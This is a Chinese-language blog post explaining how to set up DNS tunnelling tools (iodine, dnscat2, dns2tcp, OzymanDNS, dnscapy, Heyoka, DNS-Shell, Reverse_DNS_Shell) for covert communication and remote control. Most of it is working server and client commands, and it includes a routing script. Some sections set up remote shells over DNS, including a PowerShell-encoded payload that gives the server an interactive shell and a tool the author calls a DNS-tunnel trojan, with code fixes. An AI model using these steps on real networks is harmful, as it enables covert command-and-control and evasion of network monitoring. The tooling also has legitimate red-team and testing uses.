---
layout: post
title: 利用DNS隧道进行隐蔽通信和远程控制
description: "DNS Protocol"
tags: [protocol]
image:
  background: triangular.png
---
# 0. 前言

使用DNS隧道，都需要先配置域名的DNS记录。把指定域名的NS记录指向DNS隧道的服务器IP，需要添加两条记录：

```bash
t1        IN    NS   t1ns.mydomain.com.
t1ns      IN    A    100.15.213.99
```

先给t1.mydomain.com添加一条NS记录指向t1ns.mydomain.com，再指定t1ns.mydomain.com的A记录为100.15.213.99。这样，所有t1.mydomain.com下的子域名的DNS请求都会被指向到 100.15.213.99。

下面，分别说明iodine、dnscat2、dns2tcp、Heyoka、dnsshell、OzymanDNS、dnscapy等DNS隧道工具的搭建使用方法。

# 1. IODINE

## 1.1 环境准备

确认内核是否支持tun/tap：`modinfo tun`。如果无驱动，可以参考如下教程。

TUN/TAP虚拟网卡: <http://www.jb51.net/LINUXjishu/401735.html>

TUN/TAP驱动 for OSX：<http://tuntaposx.sourceforge.net/download.xhtml>

iodine README：<http://code.kryo.se/iodine/README.html>

参考教程：<https://kcore.org/2008/07/07/iodine-dns-tunnel-on-your-mac-to-escape-those-evil-firewalls/>

## 1.2 服务端配置

iodined -f -c -P secrdnetpassword 10.0.0.0 dnstun.cih.so

配置路由和网络规则：

```
sysctl -e net.ipv4.ip_forward=1
iptables -t nat -A POSTROUTING -s 10.0.0.0/255.255.255.0 -o eth0 -j MASQUERADE
```

## 1.3 客户端配置
iodine -f -P secretpassword dnstun.cih.so

运行如下脚本，自动进行路由设置。注意修改脚本前几行的配置变量：`IOD`,`IOTD`,`IOIP`等。脚本下载地址：
<http://www.doeshosting.com/code/NStun.sh>


```bash
#!/bin/sh
#############################################################################
## Small script to automate the task of correctly setting up a DNS tunnel
## client.  This must be run as root.  This script is public domain.
## This file should have chmod 500 and chown root
## http://www.doeshosting.com/code/NStun.sh is always most up to date.
## Wassup to the IRCpimps
## Please someone get tuntap working on the iphone!
## UPDATE! Thank you Friedrich Schoeller for your creative solution 
## for iphone-tun with tunemu
## Thank you to Bjorn Andersson and Erik Ekman for making iodine
##
## Bugs: -If you have 2 default routes it shouldnt know which to pick, but I
##        have a hard time picturing someone using a NS tunnel when using 2
##        default routes. 
##
## -krzee           email:  username=krzee  domain=ircpimps.org
#############################################################################


#### EDIT HERE ####

# Path to your iodine executable
IOD="/usr/local/sbin/iodine"

# Your top domain
IOTD="example.ircpimps.org"

# You may choose to store the password in this script or enter it every time
#IOPASS="your iodine password"

# You might need to change this if you use linux, or already have 
# tunnels running.  In linux iodine uses dnsX and fbsd/osX use tunX
# X represents how many tunnel interfaces exist, starting at 0
IODEV="tun0"

# The IP your iodined server uses inside the tunnel
# The man page calls this tunnel_ip
IOIP="10.7.0.1"


#### STOP EDITING ####

NS=`grep nameserver /etc/resolv.conf|head -1|awk '{print $2}'`
GW=`netstat -rn|grep -v Gateway|grep G|awk '{print $2}'|head -1`
OS=`uname`
[ -z $IOPASS ] && echo "Enter your iodine password"
[ -z $IOPASS ] && $IOD $NS $IOTD
[ -n $IOPASS ] && $IOD -P "${IOPASS}" $NS $IOTD
if ps auxw|grep iodine|grep -v grep
 then
        case "$OS" in
        Darwin|*BSD)
		route delete default
		route add $NS -gateway $GW
		route add default -gateway $IOIP
		;;
	Linux)
		route del default
		route add $NS gw $GW
		route add default gw $IOIP $IODEV
		;;
	*)
		echo "Your OS is not osX, BSD, or Linux."
		echo "I don't know how to add routes on ${OS}."
		echo "Email krzee and tell him the syntax."
		;;
	esac
 echo "Press enter when you are done with iodine"
 echo "and you want your routes back to normal"
 read yourmind
 kill -9 `ps auxw|grep iodine|grep -v grep|awk '{print $2}'`
         case "$OS" in
        Darwin|*BSD)
                route delete default
                route delete $NS
                route add default -gateway $GW
                ;;
        Linux)
                route del default
                route delete $NS
                route add default gw $GW
                ;;
        *)
                echo "Your OS is not osX, BSD, or Linux."
                echo "I don't know how to add routes on ${OS}."
                echo "Email krzee and tell him the syntax."
                ;;
        esac
 else echo there was a problem starting iodine
 echo try running it manually to troubleshoot
fi
exit
```


# 2. DNSCAT2

http://blog.csdn.net/tan6600/article/details/52142254 

可执行客户端下载：
	https://downloads.skullsecurity.org/dnscat2/

### 服务端

	ruby dnscat2.rb -e open dnstun.cih.so
	
		-e open 由客户端选择加密，可以不加密
		--secret=xxxxx 设置一个密码

服务端会展示出客户端的连接命令，其中包含了密钥。

### 客户端
./dnscat dnstun.cih.so 		直接连接。

./dnscat --secret=kingx dnstun.cih.so 	使用加密方式连接，secret为认证密码。

./dnscat --dns domain=skullseclabs.org,server=8.8.8.8,port=53

		session/window 				查看会话
		session -i 1/window -i 1	选中某个会话
		exec gedit 		执行某个命令
		shell			创建shell
						创建一个shell后，shell会在一个新的会话中，使用session命令查看新的会话，并进行交互命令。

# 3. DNS2TCP

wget http://www.hsc.fr/ressources/outils/dns2tcp/download/dns2tcp-0.5.2.tar.gz 

tar xzvf dns2tcp-0.5.2.tar.gz 

./configure
make && make install

## 服务端
/etc/dns2tcpd.conf

	listen = 0.0.0.0（Linux服务器的IP）  
	port = 53  
	user = nobody  
	chroot = /tmp  
	domain = tcp.vvvtimes.com（上面配置NS记录的域名）  
	resources = ssh:127.0.0.1:22,socks:127.0.0.1:1082,http:127.0.0.1:3128 

dns2tcpd -f /etc/dns2tcpd.conf -F -d 2 


## 客户端
dns2tcpc -r ssh -l 8888 -d 2 -z dnstun.cih.so 8.8.4.4 

ssh -p 8888 root@127.0.0.1

# 4. OzymanDNS

https://raw.githubusercontent.com/mubix/stuff/master/stolen/ozymandns_src_0.1.tgz

https://dnstunnel.de/

**Tips:  这个版本的代码有很多坑，需要手动修改代码。**

1 - 服务端只会监听本地53端口。需要修改代码使其正常使用。

修改后的关键代码如下，添加了`LocalAddr    => [$opts{ip}],`这一部分代码：

```perl
my $ns = Net::DNS::Nameserver->new(
    LocalAddr    => [$opts{ip}],
    LocalPort    => 53,
    ReplyHandler => \&reply_handler,
    Verbose      => 2,
) || die "couldn't create nameserver object\n";
```

2 - 建议注释以下行，否则运行一段时间后会报错。

```perl
# if ($qtype eq "TYPE38") { $rcode = "NOTIMPL"; goto end;};
```

## 相关依赖包

- Net/DNS.pm - http://www.net-dns.org/download/Net-DNS-1.11.tar.gz
- LWP/UserAgent.pm  - http://search.cpan.org/CPAN/authors/id/O/OA/OALDERS/libwww-perl-6.26.tar.gz
- URI.pm - http://search.cpan.org/CPAN/authors/id/E/ET/ETHER/URI-1.72.tar.gz
- Try/Tiny.pm
- MIME/Base32 - http://search.cpan.org/CPAN/authors/id/D/DA/DANPEDER/MIME-Base32-1.02a.tar.gz


**Tips: MIME/Base32新版本不兼容，需要使用旧版本:MIME-Base32-1.02a.tar.gz**

手工安装依赖包：

```bash
wget http://www.net-dns.org/download/Net-DNS-1.11.tar.gz
tar xzvf Net-DNS-1.11.tar.gz
perl Makefile.PL && make && install
```

Perl模块搜索网站：<http://search.cpan.org/~oalders/libwww-perl/lib/LWP/UserAgent.pm>

Perl模块自动安装方法，如：

	cpan clwp Try/Tiny.pm 

Perl模块卸载：
	
	pm-uninstall MIME/Base32.pm


## 使用方法
### 服务端
sudo ./nomde.pl -i 0.0.0.0 server.example.com

### 客户端

使用DNS隧道连接外部服务器的SSH：
ssh -o ProxyCommand="./droute.pl -r 8.8.4.4 sshdns.server.example.com" root@localhost

使用DNS隧道连接SSH，并创建一个Socks代理：
ssh -D 127.0.0.1：8888 -o ProxyCommand="./droute.pl -r 8.8.4.4 sshdns.server.example.com" root@localhost

**Tips: 注意客户端脚本参数中需要在中继域名前加上sshdns前缀**



# 5. DNSScapy

https://code.google.com/archive/p/dnscapy/

Download:
https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/dnscapy/dnscapy-0-99b.zip

Server:
sudo python dnscapy_server.py [DELEGATED_ZONE_NAME] [EXTERNAL_IP_ADDR]

Client:
ssh -o ProxyCommand="sudo python dnscapy_client.py [DELEGATED_ZONE_NAME] [IP_ADDR_OF_CLIENT_DNS]" yourlogin@localhost



# 6. Heyoka

http://heyoka.sourceforge.net/

https://www.youtube.com/watch?v=Qono_XybsbA

### 服务端
heyoka.exe -m -d dnstunw.cih.so -l -p 8080

### 客户端
heyoka.exe -s -d dnstunw.cih.so -p 3389

将slave机器的3389映射到master机器的8080上？还有待测试

# 7. DnsShell  -  (ForWindows)

<https://github.com/sensepost/DNS-Shell>

## 服务端

### 基于DNS中继的方式
```
python DNS-shell.py -l -r dnstun.cih.so
```

### 基于连接的方式
```
python DNS-shell.py -l -d [Server IP]
```

## 客户端
服务端执行脚本后会得到一段payload，在客户端执行它。服务端即可获得一个交互式shell。
```
powershell.exe -e [payload]
```

# 8. ReverseDnsShell

基于直接连接的DNS隧道木马

https://github.com/ahhh/Reverse_DNS_Shell

## 服务端
```
python reverse_dns_shell_server.py
```
## 客户端
```
python reverse_dns_shell_client.py -s server_ip
```

## Tips
代码使用时存在一些bug，修复如下，在dnsMakeQuery函数中设置timeout：
```
def dnsMakeQuery(url, host):
  feedback_request = dns.message.make_query(url, dns.rdatatype.A)
  print 'ready udp'
  dns.query.udp(feedback_request, host, timeout=5)
```
修改后的代码：
<https://github.com/KxCode/Reverse_DNS_Shell>